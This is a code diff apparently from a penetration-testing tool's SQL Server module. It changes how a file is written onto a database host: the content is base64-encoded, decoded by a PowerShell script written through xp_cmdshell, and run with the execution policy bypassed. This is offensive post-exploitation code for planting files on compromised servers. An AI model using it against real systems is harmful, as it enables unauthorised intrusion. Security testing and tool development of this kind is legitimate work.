@@ -173,24 +173,15 @@ class Filesystem(GenericFilesystem):
         randPSScript = "tmpf%s.ps1" % randomStr(lowercase=True)
         randPSScriptPath = "%s\%s" % (tmpPath, randPSScript)
 
-        print "wFileContent:", wFileContent
-        print "dFile:", dFile
-        print "fileType:", fileType
-
         encodedFileContent = base64encode(wFileContent)
-
-        # TODO: need to be fixed
-        #psString = "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(%s)) > %s" % (encodedFileContent, dFile)
-        #psString = "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"%s\")) | Out-File -Encoding \"ASCII\" %s" % (encodedFileContent, dFile)
-        psString = "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"%s\")) ^> %s" % (encodedFileContent, dFile)
+        #psString = "[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(\"%s\")) | Out-File \"%s\"" % (encodedFileContent, dFile)
+        psString = "[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(\"%s\")) ^> \"%s\"" % (encodedFileContent, dFile)
 
         logger.debug("uploading the PowerShell script to %s, please wait.." % randPSScriptPath)
-
         self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)
 
         logger.debug("executing the PowerShell script to write the %s file" % dFile)
-
-        self.execCmd("powershell -File \"%s\"" % randPSScriptPath)
+        self.execCmd("powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath)
 
     def _stackedWriteFileDebugExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
         infoMsg = "using debug.exe to write the %s " % fileType
